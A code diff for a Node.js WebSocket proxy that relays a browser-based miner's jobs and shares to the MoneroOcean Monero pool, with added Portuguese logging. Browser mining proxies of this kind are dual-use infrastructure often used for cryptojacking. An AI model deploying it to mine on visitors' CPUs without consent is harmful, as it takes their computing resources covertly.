@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 8080;
 const serverHttp = http.createServer((req, res) => {
     cors()(req, res, () => {
         res.writeHead(200, { 'Content-Type': 'text/plain' });
-        res.end('Proxy CryptoNight Ativo!');
+        res.end('Proxy CryptoNight Ativo e Live!');
     });
 });
 
@@ -16,7 +16,7 @@ const wss = new WebSocket.Server({ server: serverHttp });
 console.log(`🚀 Proxy Stratum ativo na porta ${PORT}`);
 
 wss.on('connection', (ws) => {
-    console.log('🔗 SINAL RECEBIDO: Navegador conectado ao Proxy.');
+    console.log('🔗 SINAL RECEBIDO: O navegador conectou com o Proxy!');
     let stratumClient = null;
     let poolConnected = false;
     let tcpBuffer = "";
@@ -24,17 +24,20 @@ wss.on('connection', (ws) => {
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
+            console.log('📥 Mensagem do Navegador:', data.identifier || data.type || 'Dados crus');
 
-            if (data.identifier === 'handshake') {
+            // CORREÇÃO: Validação flexível para capturar o Handshake enviado pelo miner.js
+            if (data.identifier === 'handshake' || data.type === 'login' || data.identifier === 'login') {
                 if (stratumClient) stratumClient.destroy();
                 stratumClient = new net.Socket();
                 
-                // Conecta na porta padrão da MoneroOcean
+                console.log('⏳ Tentando abrir socket TCP com a Pool MoneroOcean...');
+                
                 stratumClient.connect(18081, 'gulf.moneroocean.stream', () => {
-                    console.log('✅ Proxy conectado via TCP à Pool MoneroOcean!');
+                    console.log('✅ CONECTADO VIA TCP À POOL MONEROOCEAN!');
                     poolConnected = true;
 
-                    // CORREÇÃO: Captura exatamente as chaves enviadas pelo miner.js do Netlify
+                    // Monta o cabeçalho JSON-RPC exigido pela Pool
                     const stratumLogin = {
                         id: 1,
                         method: "login",
@@ -45,11 +48,13 @@ wss.on('connection', (ws) => {
                         }
                     };
                     stratumClient.write(JSON.stringify(stratumLogin) + "\n");
+                    console.log('📤 Login enviado para a Pool!');
                 });
 
                 stratumClient.on('data', (chunk) => {
                     tcpBuffer += chunk.toString();
-                    console.log("📥 Resposta crua da Pool TCP:", chunk.toString()); // ADICIONE ESTA LINHA PARA DIAGNÓSTICO
+                    console.log("📥 Resposta crua vinda da Pool TCP:", chunk.toString());
+
                     let lines = tcpBuffer.split("\n");
                     tcpBuffer = lines.pop();
 
@@ -57,24 +62,23 @@ wss.on('connection', (ws) => {
                         if (!line.trim()) return;
                         try {
                             const poolData = JSON.parse(line);
-                            // Envia os Jobs criptográficos reais da Pool direto para o miner.js
+                            // Encaminha os Jobs reais para o miner.js rodar na CPU
                             if (poolData.result && poolData.result.job) {
                                 ws.send(JSON.stringify({ identifier: "job", ...poolData.result.job }));
                             } else if (poolData.method === "job") {
                                 ws.send(JSON.stringify({ identifier: "job", ...poolData.params }));
                             } else if (poolData.result && poolData.result.status === "OK") {
                                 ws.send(JSON.stringify({ identifier: "hash" }));
-                                console.log("🔥 SUCESSO: Hash aceito e computado na Pool MoneroOcean!");
+                                console.log("🔥 SUCESSO: Hash validado e aceito!");
                             }
                         } catch (e) {}
                     });
                 });
 
-                stratumClient.on('error', () => ws.close());
-                stratumClient.on('close', () => ws.close());
+                stratumClient.on('error', (err) => console.error('❌ Erro no socket TCP:', err.message));
+                stratumClient.on('close', () => console.log('❌ Conexão com a Pool encerrada.'));
             }
 
-            // Repassa os hashes reais minerados para a validação da Pool
             if (data.identifier === 'submit' && poolConnected && stratumClient?.writable) {
                 const stratumSubmit = {
                     id: 2,
@@ -82,9 +86,11 @@ wss.on('connection', (ws) => {
                     params: { id: data.job_id, job_id: data.job_id, nonce: data.nonce, result: data.result }
                 };
                 stratumClient.write(JSON.stringify(stratumSubmit) + "\n");
-                console.log(`📤 Enviando share calculado para a Pool (Job ID: ${data.job_id})`);
+                console.log(`📤 Compartilhamento (Share) enviado para a Pool.`);
             }
-        } catch (err) {}
+        } catch (err) {
+            console.error('❌ Erro no processamento do WebSocket:', err.message);
+        }
     });
 
     ws.on('close', () => { if (stratumClient) stratumClient.destroy(); });
